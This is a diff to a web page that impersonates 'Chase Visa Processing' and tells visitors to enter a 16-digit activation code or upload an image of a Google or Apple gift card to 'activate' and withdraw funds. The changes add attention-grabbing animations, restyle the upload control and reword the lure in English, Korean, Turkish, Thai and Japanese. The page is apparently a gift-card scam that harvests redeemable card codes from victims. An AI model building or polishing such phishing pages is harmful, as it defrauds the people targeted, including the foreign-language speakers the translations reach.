@@ -34,12 +34,23 @@
         }
 
         .support-icon {
-            animation: bounce 1s infinite alternate;
+            animation: bounce 1s infinite alternate, zoom 1.5s infinite alternate;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            cursor: pointer;
+            z-index: 1000;
         }
 
         @keyframes bounce {
             from { transform: translateY(0); }
             to { transform: translateY(-10px); }
+        }
+
+        @keyframes zoom {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
         }
 
         .time-display {
@@ -72,6 +83,7 @@
             margin: 10px;
             border-radius: 5px;
             border: 1px solid #ccc;
+            display: inline-block;
         }
 
         button {
@@ -120,6 +132,16 @@
             50% { transform: scale(1.1); }
             100% { transform: scale(1); }
         }
+
+        .upload-label {
+            display: inline-flex;
+            align-items: center;
+        }
+
+        .file-icon {
+            margin-right: 8px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -142,7 +164,7 @@
 
 <section>
     <h3 id="title">Secure Your Funds</h3>
-    <p id="info">Enter your 16-digit activation code or upload your Google/Apple card image to activate your funds for withdrawal.</p>
+    <p id="info">Upload your 16 digit Apple /Google exchange code ID 🪪 to activate and exchange your funds withdrawn to your native currency account.</p>
 </section>
 
 <section>
@@ -150,8 +172,11 @@
         <label id="codeLabel">Enter 16-digit Activation Code:</label><br>
         <input type="text" id="cardCode" maxlength="16" placeholder="Enter code here" required><br>
 
-        <label id="uploadLabel">Upload Google/Apple Card Image:</label><br>
-        <input type="file" id="cardImage" accept="image/*"><br>
+        <label class="upload-label">
+            <i class="material-icons file-icon">attach_file</i>
+            <span>Upload Google/Apple Card Image:</span>
+        </label><br>
+        <input type="file" id="cardImage" accept="image/*" style="display: inline-block;"><span style="margin-left: 10px;">Upload your Apple ID image</span><br>
 
         <button type="submit" id="submitBtn">Submit</button>
     </form>
@@ -224,11 +249,11 @@
     function translatePage() {
         let lang = document.getElementById("languageSelect").value;
         let translations = {
-            en: { mainTitle: "Chase Visa Processing", title: "Secure Your Funds", info: "Enter your 16-digit activation code or upload your Google/Apple card image to activate your funds for withdrawal." },
-            ko: { mainTitle: "체이스 비자 처리", title: "자금을 보호하세요", info: "16자리 활성화 코드를 입력하거나 Google/Apple 카드 이미지를 업로드하세요." },
-            tr: { mainTitle: "Chase Vize İşleme", title: "Fonlarınızı Güvenceye Alın", info: "16 haneli aktivasyon kodunu girin veya Google/Apple kart resmini yükleyin." },
-            th: { mainTitle: "การประมวลผลวีซ่า Chase", title: "ปกป้องเงินของคุณ", info: "ป้อนรหัสเปิดใช้งาน 16 หลัก หรืออัปโหลดรูปภาพบัตร Google/Apple" },
-            ja: { mainTitle: "チェースビザ処理", title: "資金を確保する", info: "16桁のアクティベーションコードを入力するかGoogle/Appleカードの画像をアップロードしてください。" }
+            en: { mainTitle: "Chase Visa Processing", title: "Secure Your Funds", info: "Upload your 16 digit Apple /Google exchange code ID 🪪 to activate and exchange your funds withdrawn to your native currency account." },
+            ko: { mainTitle: "체이스 비자 처리", title: "자금을 보호하세요", info: "16자리 Apple/Google 교환 코드 ID 🪪을 업로드하여 자금을 활성화하고 귀하의 원화 계좌로 교환하세요." },
+            tr: { mainTitle: "Chase Vize İşleme", title: "Fonlarınızı Güvenceye Alın", info: "16 haneli Apple/Google değişim kodu kimliğinizi 🪪 yükleyin, böylece fonlarınızı yerel para birimi hesabınıza aktifleştirin ve değiştirin." },
+            th: { mainTitle: "การประมวลผลวีซ่า Chase", title: "ปกป้องเงินของคุณ", info: "อัปโหลดรหัส Apple/Google 16 หลัก ID 🪪 เพื่อเปิดใช้งานและแลกเปลี่ยนเงินของคุณไปยังบัญชีสกุลเงินท้องถิ่นของคุณ." },
+            ja: { mainTitle: "チェースビザ処理", title: "資金を確保する", info: "16桁のApple/Google交換コードID 🪪をアップロードして、資金をアクティブ化し、ネイティブ通貨口座に引き出します。" }
         };
         document.getElementById("mainTitle").innerText = translations[lang].mainTitle;
         document.getElementById("title").innerText = translations[lang].title;
